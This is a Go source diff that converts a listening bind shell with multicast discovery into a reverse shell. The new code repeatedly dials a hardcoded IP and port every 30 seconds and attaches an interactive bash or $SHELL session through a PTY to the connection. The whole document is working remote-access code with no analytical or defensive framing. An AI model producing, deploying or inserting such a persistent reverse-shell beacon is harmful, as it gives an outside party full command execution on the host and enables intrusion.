@@ -6,96 +6,58 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"time"
 
 	"github.com/creack/pty"
 )
 
 const (
-	multicastAddr = "224.0.0.1"
-	multicastPort = 9999
+	clientIP   = "10.119.101.110" // Replace this with your client's IP address
+	clientPort = 8080
+	retryDelay = 30 * time.Second
 )
 
 func main() {
-	go runMulticastListener()
-
-	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", multicastPort))
-	if err != nil {
-		fmt.Println("Error starting server:", err)
-		os.Exit(1)
-	}
-	defer listener.Close()
-
-	fmt.Printf("Server listening on port %d...\n", multicastPort)
+	var conn net.Conn
+	var err error
 
 	for {
-		conn, err := listener.Accept()
-		if err != nil {
-			fmt.Println("Error accepting connection:", err)
-			continue
-		}
-
-		go handleConnection(conn)
-	}
-}
-
-func runMulticastListener() {
-	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", multicastAddr, multicastPort))
-	if err != nil {
-		fmt.Println("Error resolving multicast address:", err)
-		return
-	}
-
-	listener, err := net.ListenMulticastUDP("udp", nil, addr)
-	if err != nil {
-		fmt.Println("Error setting up multicast listener:", err)
-		return
-	}
-	defer listener.Close()
-
-	buf := make([]byte, 1024)
-
-	for {
-		n, clientAddr, err := listener.ReadFromUDP(buf)
-		if err != nil {
-			fmt.Println("Error reading from multicast:", err)
-			continue
-		}
-
-		clientIP := clientAddr.IP.String()
-		fmt.Printf("Received multicast from client IP: %s\n", clientIP)
-
-		message := string(buf[:n])
-		if message == "CLIENT_SEARCHING" {
-			response := fmt.Sprintf("SERVER_READY:%d", multicastPort)
-			_, err = listener.WriteToUDP([]byte(response), clientAddr)
-			if err != nil {
-				fmt.Println("Error sending response to multicast:", err)
+		for {
+			conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", clientIP, clientPort))
+			if err == nil {
+				break
 			}
+
+			fmt.Printf("Error connecting to client: %v. Retrying in %v...\n", err, retryDelay)
+			time.Sleep(retryDelay)
 		}
+
+		fmt.Printf("Connected to client at %s:%d\n", clientIP, clientPort)
+		handleConnection(conn)
+		conn.Close()
+
+		fmt.Printf("Connection closed. Retrying connection to client in %v...\n", retryDelay)
+		time.Sleep(retryDelay)
 	}
 }
 
 func handleConnection(conn net.Conn) {
-	defer conn.Close()
+	shell := os.Getenv("SHELL")
+	if shell == "" {
+		shell = "/bin/bash"
+	}
 
-	shell := exec.Command("bash")
-	pty, err := pty.Start(shell)
+	cmd := exec.Command(shell)
+	ptmx, err := pty.Start(cmd)
 	if err != nil {
-		fmt.Println("Error starting PTY:", err)
+		fmt.Println("Error starting pty:", err)
 		return
 	}
-	defer pty.Close()
-
-	done := make(chan struct{})
-	go func() {
-		io.Copy(pty, conn)
-		close(done)
-	}()
+	defer ptmx.Close()
 
 	go func() {
-		io.Copy(conn, pty)
-		close(done)
+		_, _ = io.Copy(ptmx, conn)
 	}()
 
-	<-done
+	_, _ = io.Copy(conn, ptmx)
 }
